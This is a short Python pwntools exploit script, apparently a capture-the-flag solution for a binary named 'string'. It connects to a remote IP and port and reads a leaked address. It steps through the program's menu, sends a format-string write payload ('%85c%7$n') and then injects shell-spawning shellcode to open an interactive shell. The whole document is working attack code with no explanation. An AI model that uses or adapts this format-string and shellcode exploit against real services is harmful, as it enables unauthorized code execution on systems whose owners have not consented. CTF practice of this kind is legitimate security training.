from pwn import *
context(arch='amd64', os='linux', log_level='debug')
# sh = process("./string")
sh = remote("61.147.171.105", 51156)

sh.recvuntil("secret[0] is ")

secret0 = int(sh.recvuntil('\n'), 16)
print(hex(secret0))

shellcode = asm(shellcraft.sh())

sh.sendlineafter("be:", b'name')
sh.sendlineafter("up?:", b'east')
sh.sendlineafter("leave(0)?:", b'1')
sh.sendlineafter("'Give me an address'", str(secret0))
sh.sendlineafter("wish is:", b'%85c%7$n')
sh.sendlineafter("YOU SPELL", shellcode)
sh.interactive()




